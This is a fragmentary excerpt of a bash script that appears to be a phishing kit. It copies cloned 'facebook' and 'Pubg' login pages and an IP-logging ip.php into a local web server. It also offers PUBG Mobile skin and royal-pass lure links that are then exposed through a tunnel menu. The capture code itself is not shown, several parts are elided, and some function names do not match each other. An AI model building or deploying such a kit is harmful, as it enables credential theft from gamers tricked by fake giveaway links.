...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${RAJPUT} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
setup_site() {
	...
	cp -rf Moazamali404/"$website"/* .server/www
	cp -f Moazamali404/ip.php .server/www/
...
## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} MoazamAli Server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_Moazam; }
...
${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier	
	...
	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		rajput404='http://pubg-mobile-skin'
		tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
	        website="Pubg"
		rajput404='http://pubg-mobile-royalpass'
		tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
	        website="Testing"
		rajput404='http://pubg-mobile-glacier'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_moazam; rajputhacker_facebook; }
	fi
}
